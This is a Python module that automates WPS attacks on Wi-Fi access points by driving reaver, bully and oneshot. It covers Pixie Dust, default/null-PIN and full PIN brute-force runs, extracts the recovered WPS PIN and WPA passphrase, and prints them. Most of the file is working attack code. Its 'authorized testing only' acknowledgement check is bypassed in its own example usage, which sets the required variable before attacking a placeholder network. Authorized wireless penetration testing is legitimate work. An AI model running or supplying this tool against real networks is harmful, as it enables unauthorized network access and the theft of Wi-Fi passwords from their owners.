"""
WPS (WiFi Protected Setup) Vulnerability Testing

For authorized security testing only!
Tests WPS PIN vulnerabilities and Pixie Dust attacks.

Similar to: Reaver, Bully, OneShot
"""

import subprocess
import time
import re
import os
from typing import Optional, Dict, List
from dataclasses import dataclass
from enum import Enum
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class WPSAttackType(Enum):
    """WPS attack types"""
    PIN_BRUTEFORCE = "pin_bruteforce"  # Standard PIN brute force
    PIXIE_DUST = "pixie_dust"  # Pixie Dust attack (offline)
    NULL_PIN = "null_pin"  # Try common null PINs
    REAVER = "reaver"  # Reaver attack
    BULLY = "bully"  # Bully attack


class WPSStatus(Enum):
    """WPS attack status"""
    NOT_STARTED = "not_started"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    WPS_LOCKED = "wps_locked"  # AP locked WPS
    WPS_DISABLED = "wps_disabled"  # WPS not enabled


@dataclass
class WPSResult:
    """WPS attack result"""
    status: WPSStatus
    ssid: str
    bssid: str
    wps_pin: Optional[str] = None
    wpa_psk: Optional[str] = None  # WPA password
    attack_type: Optional[WPSAttackType] = None
    duration: Optional[float] = None
    attempts: int = 0


class WPSAttack:
    """
    WPS Vulnerability Testing

    Tests WPS PIN vulnerabilities for authorized security testing.
    For authorized security testing only!
    """

    def __init__(self, interface: str = "wlan0mon"):
        """
        Initialize WPS attack

        Args:
            interface: Monitor mode interface (e.g., wlan0mon)

        ⚠️ WARNING: Only test networks you have authorization to test!
        """
        self.interface = interface

        # Check authorization
        self._check_authorization()

        # Verify monitor mode
        if not self._verify_monitor_mode():
            logger.warning(f"{interface} may not be in monitor mode")

        # Check available tools
        self.available_tools = self._check_tools()
        logger.info(f"Available WPS tools: {', '.join(self.available_tools)}")

    def _check_authorization(self):
        """Verify user has acknowledged legal warning"""
        if not os.environ.get('WIFI_PENTEST_ACKNOWLEDGED'):
            raise PermissionError(
                "⚠️ You must acknowledge the legal warning before using this tool.\n"
                "See LEGAL_WARNING.md and set WIFI_PENTEST_ACKNOWLEDGED=1"
            )

    def _verify_monitor_mode(self) -> bool:
        """Verify interface is in monitor mode"""
        try:
            result = subprocess.run(
                ['iwconfig', self.interface],
                capture_output=True,
                text=True,
                check=False
            )
            return 'Mode:Monitor' in result.stdout
        except FileNotFoundError:
            logger.warning("iwconfig not found, cannot verify monitor mode")
            return True

    def _check_tools(self) -> List[str]:
        """Check which WPS tools are available"""
        tools = []

        for tool in ['reaver', 'bully', 'oneshot']:
            try:
                subprocess.run(
                    [tool, '--help'],
                    capture_output=True,
                    check=False,
                    timeout=5
                )
                tools.append(tool)
            except (FileNotFoundError, subprocess.TimeoutExpired):
                pass

        return tools

    def test_wps(
        self,
        target_bssid: str,
        target_ssid: str,
        channel: int,
        attack_type: WPSAttackType = WPSAttackType.PIXIE_DUST,
        timeout: int = 600
    ) -> WPSResult:
        """
        Test WPS vulnerability

        Args:
            target_bssid: Target AP MAC address
            target_ssid: Target network SSID
            channel: WiFi channel
            attack_type: Type of WPS attack
            timeout: Attack timeout in seconds

        Returns:
            WPSResult with attack results

        ⚠️ WARNING: Only target networks you have authorization to test!
        """
        logger.info(f"Starting WPS attack on {target_ssid} ({target_bssid})")
        logger.info(f"Channel: {channel}, Attack: {attack_type.value}, Timeout: {timeout}s")

        # Check if WPS is enabled
        if not self._check_wps_enabled(target_bssid, channel):
            logger.warning("WPS does not appear to be enabled on target")
            return WPSResult(
                status=WPSStatus.WPS_DISABLED,
                ssid=target_ssid,
                bssid=target_bssid
            )

        # Try Pixie Dust first (fastest)
        if attack_type == WPSAttackType.PIXIE_DUST:
            result = self._pixie_dust_attack(target_bssid, target_ssid, channel, timeout)
            if result.status == WPSStatus.SUCCESS:
                return result

        # Try NULL PIN attack (very fast)
        if attack_type == WPSAttackType.NULL_PIN:
            result = self._null_pin_attack(target_bssid, target_ssid, channel)
            if result.status == WPSStatus.SUCCESS:
                return result

        # Try full PIN brute force (slow)
        if attack_type == WPSAttackType.PIN_BRUTEFORCE:
            result = self._pin_bruteforce_attack(target_bssid, target_ssid, channel, timeout)
            return result

        # Default: Try available tools
        if 'reaver' in self.available_tools:
            return self._reaver_attack(target_bssid, target_ssid, channel, timeout)
        elif 'bully' in self.available_tools:
            return self._bully_attack(target_bssid, target_ssid, channel, timeout)
        else:
            logger.error("No WPS attack tools available")
            return WPSResult(
                status=WPSStatus.FAILED,
                ssid=target_ssid,
                bssid=target_bssid
            )

    def _check_wps_enabled(self, bssid: str, channel: int) -> bool:
        """
        Check if WPS is enabled on target

        Args:
            bssid: Target BSSID
            channel: Channel

        Returns:
            True if WPS is enabled
        """
        try:
            # Use wash to detect WPS
            result = subprocess.run(
                ['wash', '-i', self.interface, '-c', str(channel)],
                capture_output=True,
                text=True,
                timeout=30
            )

            # Check if BSSID appears in wash output
            return bssid in result.stdout

        except (FileNotFoundError, subprocess.TimeoutExpired):
            logger.warning("wash not available or timed out, assuming WPS is enabled")
            return True
        except Exception as e:
            logger.error(f"WPS check error: {e}")
            return True

    def _pixie_dust_attack(
        self,
        bssid: str,
        ssid: str,
        channel: int,
        timeout: int
    ) -> WPSResult:
        """
        Pixie Dust attack (offline WPS attack)

        Very fast if vulnerable (seconds vs hours)
        """
        logger.info("Attempting Pixie Dust attack...")

        if 'oneshot' not in self.available_tools and 'reaver' not in self.available_tools:
            logger.error("No Pixie Dust tools available")
            return WPSResult(status=WPSStatus.FAILED, ssid=ssid, bssid=bssid)

        start_time = time.time()

        try:
            # Try OneShot (newer, better)
            if 'oneshot' in self.available_tools:
                cmd = [
                    'python3', '-m', 'oneshot',
                    '-i', self.interface,
                    '-b', bssid,
                    '-K'  # Pixie Dust
                ]
            else:
                # Try Reaver with Pixie Dust
                cmd = [
                    'reaver',
                    '-i', self.interface,
                    '-b', bssid,
                    '-c', str(channel),
                    '-K', '1',  # Pixie Dust
                    '-vv'
                ]

            logger.info(f"Running: {' '.join(cmd)}")

            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            # Monitor output
            pin = None
            psk = None

            while True:
                line = proc.stdout.readline()
                if not line:
                    break

                logger.debug(line.strip())

                # Check for PIN
                pin_match = re.search(r'WPS PIN:\s*["\']?(\d{8})["\']?', line, re.IGNORECASE)
                if pin_match:
                    pin = pin_match.group(1)
                    logger.info(f"✓ Found WPS PIN: {pin}")

                # Check for PSK
                psk_match = re.search(r'WPA PSK:\s*["\']?([^\'"]+)["\']?', line, re.IGNORECASE)
                if psk_match:
                    psk = psk_match.group(1)
                    logger.info(f"✓ Found WPA PSK: {psk}")

                # Check for WPS locked
                if 'locked' in line.lower() or 'rate limit' in line.lower():
                    logger.warning("WPS appears to be locked")
                    proc.terminate()
                    return WPSResult(
                        status=WPSStatus.WPS_LOCKED,
                        ssid=ssid,
                        bssid=bssid,
                        attack_type=WPSAttackType.PIXIE_DUST
                    )

                # Check timeout
                if time.time() - start_time > timeout:
                    logger.warning("Pixie Dust attack timed out")
                    proc.terminate()
                    break

            proc.wait(timeout=10)
            duration = time.time() - start_time

            if pin and psk:
                logger.info(f"✓ Pixie Dust attack successful in {duration:.1f}s")
                return WPSResult(
                    status=WPSStatus.SUCCESS,
                    ssid=ssid,
                    bssid=bssid,
                    wps_pin=pin,
                    wpa_psk=psk,
                    attack_type=WPSAttackType.PIXIE_DUST,
                    duration=duration
                )
            else:
                logger.info("Pixie Dust attack failed")
                return WPSResult(
                    status=WPSStatus.FAILED,
                    ssid=ssid,
                    bssid=bssid,
                    attack_type=WPSAttackType.PIXIE_DUST,
                    duration=duration
                )

        except Exception as e:
            logger.error(f"Pixie Dust attack error: {e}")
            return WPSResult(
                status=WPSStatus.FAILED,
                ssid=ssid,
                bssid=bssid,
                attack_type=WPSAttackType.PIXIE_DUST
            )

    def _null_pin_attack(self, bssid: str, ssid: str, channel: int) -> WPSResult:
        """
        Try common NULL/default PINs

        Very fast (seconds), works on some routers
        """
        logger.info("Attempting NULL PIN attack...")

        # Common default/NULL PINs
        common_pins = [
            '00000000',  # NULL PIN
            '12345670',  # Common default
            '00000010',  # Another common
            '01234567',
            '11111111',
        ]

        start_time = time.time()

        for pin in common_pins:
            logger.info(f"Trying PIN: {pin}")

            try:
                # Try PIN with reaver
                cmd = [
                    'reaver',
                    '-i', self.interface,
                    '-b', bssid,
                    '-c', str(channel),
                    '-p', pin,
                    '-vv'
                ]

                proc = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=60
                )

                output = proc.stdout + proc.stderr

                # Check for success
                psk_match = re.search(r'WPA PSK:\s*["\']?([^\'"]+)["\']?', output, re.IGNORECASE)
                if psk_match:
                    psk = psk_match.group(1)
                    duration = time.time() - start_time

                    logger.info(f"✓ NULL PIN attack successful! PIN: {pin}")
                    return WPSResult(
                        status=WPSStatus.SUCCESS,
                        ssid=ssid,
                        bssid=bssid,
                        wps_pin=pin,
                        wpa_psk=psk,
                        attack_type=WPSAttackType.NULL_PIN,
                        duration=duration,
                        attempts=common_pins.index(pin) + 1
                    )

            except subprocess.TimeoutExpired:
                logger.debug(f"PIN {pin} timed out")
                continue
            except Exception as e:
                logger.debug(f"PIN {pin} error: {e}")
                continue

        duration = time.time() - start_time
        logger.info("NULL PIN attack failed")
        return WPSResult(
            status=WPSStatus.FAILED,
            ssid=ssid,
            bssid=bssid,
            attack_type=WPSAttackType.NULL_PIN,
            duration=duration,
            attempts=len(common_pins)
        )

    def _pin_bruteforce_attack(
        self,
        bssid: str,
        ssid: str,
        channel: int,
        timeout: int
    ) -> WPSResult:
        """
        Full PIN brute force attack

        Very slow (hours to days), but comprehensive
        Note: Most routers implement rate limiting and lockout
        """
        logger.info("Starting PIN brute force attack (this may take hours)...")
        logger.warning("Most routers will lock WPS after failed attempts")

        start_time = time.time()
        attempts = 0

        try:
            # Use reaver for brute force
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', bssid,
                '-c', str(channel),
                '-vv',
                '-d', '15',  # Delay between attempts
                '-T', '0.5',  # Timeout per attempt
                '-r', '3:15'  # Retry with delay
            ]

            logger.info(f"Running: {' '.join(cmd)}")

            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            pin = None
            psk = None

            while True:
                line = proc.stdout.readline()
                if not line:
                    break

                logger.debug(line.strip())

                # Count attempts
                if 'trying pin' in line.lower():
                    attempts += 1
                    if attempts % 10 == 0:
                        elapsed = time.time() - start_time
                        logger.info(f"Attempts: {attempts}, Elapsed: {elapsed:.1f}s")

                # Check for PIN
                pin_match = re.search(r'WPS PIN:\s*["\']?(\d{8})["\']?', line, re.IGNORECASE)
                if pin_match:
                    pin = pin_match.group(1)
                    logger.info(f"✓ Found WPS PIN: {pin}")

                # Check for PSK
                psk_match = re.search(r'WPA PSK:\s*["\']?([^\'"]+)["\']?', line, re.IGNORECASE)
                if psk_match:
                    psk = psk_match.group(1)
                    logger.info(f"✓ Found WPA PSK: {psk}")

                # Check for WPS locked
                if 'locked' in line.lower() or 'rate limit' in line.lower():
                    logger.warning("WPS locked due to failed attempts")
                    proc.terminate()
                    return WPSResult(
                        status=WPSStatus.WPS_LOCKED,
                        ssid=ssid,
                        bssid=bssid,
                        attack_type=WPSAttackType.PIN_BRUTEFORCE,
                        attempts=attempts
                    )

                # Check timeout
                if time.time() - start_time > timeout:
                    logger.warning("Brute force attack timed out")
                    proc.terminate()
                    break

            proc.wait(timeout=10)
            duration = time.time() - start_time

            if pin and psk:
                logger.info(f"✓ Brute force successful in {duration:.1f}s ({attempts} attempts)")
                return WPSResult(
                    status=WPSStatus.SUCCESS,
                    ssid=ssid,
                    bssid=bssid,
                    wps_pin=pin,
                    wpa_psk=psk,
                    attack_type=WPSAttackType.PIN_BRUTEFORCE,
                    duration=duration,
                    attempts=attempts
                )
            else:
                logger.info(f"Brute force failed after {attempts} attempts")
                return WPSResult(
                    status=WPSStatus.FAILED,
                    ssid=ssid,
                    bssid=bssid,
                    attack_type=WPSAttackType.PIN_BRUTEFORCE,
                    duration=duration,
                    attempts=attempts
                )

        except Exception as e:
            logger.error(f"Brute force error: {e}")
            duration = time.time() - start_time
            return WPSResult(
                status=WPSStatus.FAILED,
                ssid=ssid,
                bssid=bssid,
                attack_type=WPSAttackType.PIN_BRUTEFORCE,
                duration=duration,
                attempts=attempts
            )

    def _reaver_attack(
        self,
        bssid: str,
        ssid: str,
        channel: int,
        timeout: int
    ) -> WPSResult:
        """Reaver attack (wrapper for compatibility)"""
        return self._pixie_dust_attack(bssid, ssid, channel, timeout)

    def _bully_attack(
        self,
        bssid: str,
        ssid: str,
        channel: int,
        timeout: int
    ) -> WPSResult:
        """
        Bully attack

        Alternative to Reaver
        """
        logger.info("Attempting Bully attack...")

        start_time = time.time()

        try:
            cmd = [
                'bully',
                self.interface,
                '-b', bssid,
                '-c', str(channel),
                '-v', '3'
            ]

            logger.info(f"Running: {' '.join(cmd)}")

            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            pin = None
            psk = None

            while True:
                line = proc.stdout.readline()
                if not line:
                    break

                logger.debug(line.strip())

                # Check for PIN
                pin_match = re.search(r'PIN:\s*(\d{8})', line, re.IGNORECASE)
                if pin_match:
                    pin = pin_match.group(1)

                # Check for PSK
                psk_match = re.search(r'KEY:\s*(.+)', line, re.IGNORECASE)
                if psk_match:
                    psk = psk_match.group(1).strip()

                # Check timeout
                if time.time() - start_time > timeout:
                    proc.terminate()
                    break

            proc.wait(timeout=10)
            duration = time.time() - start_time

            if pin and psk:
                return WPSResult(
                    status=WPSStatus.SUCCESS,
                    ssid=ssid,
                    bssid=bssid,
                    wps_pin=pin,
                    wpa_psk=psk,
                    attack_type=WPSAttackType.BULLY,
                    duration=duration
                )
            else:
                return WPSResult(
                    status=WPSStatus.FAILED,
                    ssid=ssid,
                    bssid=bssid,
                    attack_type=WPSAttackType.BULLY,
                    duration=duration
                )

        except Exception as e:
            logger.error(f"Bully attack error: {e}")
            return WPSResult(
                status=WPSStatus.FAILED,
                ssid=ssid,
                bssid=bssid,
                attack_type=WPSAttackType.BULLY
            )


# Example usage
if __name__ == "__main__":
    import os
    os.environ['WIFI_PENTEST_ACKNOWLEDGED'] = '1'

    print("\n⚠️  AUTHORIZED SECURITY TESTING ONLY ⚠️\n")
    print("Ensure you have written authorization to test this network!\n")

    # Example: Test WPS vulnerability
    attacker = WPSAttack(interface="wlan0mon")

    # Target network info
    target_bssid = "00:11:22:33:44:55"
    target_ssid = "TestNetwork"
    channel = 6

    # Try Pixie Dust first (fastest)
    print("=== Attempting Pixie Dust Attack ===")
    result = attacker.test_wps(
        target_bssid=target_bssid,
        target_ssid=target_ssid,
        channel=channel,
        attack_type=WPSAttackType.PIXIE_DUST,
        timeout=300
    )

    if result.status == WPSStatus.SUCCESS:
        print(f"\n✓ WPS attack successful!")
        print(f"  SSID: {result.ssid}")
        print(f"  BSSID: {result.bssid}")
        print(f"  WPS PIN: {result.wps_pin}")
        print(f"  WPA PSK: {result.wpa_psk}")
        print(f"  Duration: {result.duration:.1f}s")
    else:
        print(f"\n✗ WPS attack failed: {result.status.value}")

        # Try NULL PIN as fallback
        if result.status != WPSStatus.WPS_LOCKED:
            print("\n=== Attempting NULL PIN Attack ===")
            result = attacker.test_wps(
                target_bssid=target_bssid,
                target_ssid=target_ssid,
                channel=channel,
                attack_type=WPSAttackType.NULL_PIN,
                timeout=60
            )

            if result.status == WPSStatus.SUCCESS:
                print(f"\n✓ NULL PIN attack successful!")
                print(f"  WPS PIN: {result.wps_pin}")
                print(f"  WPA PSK: {result.wpa_psk}")
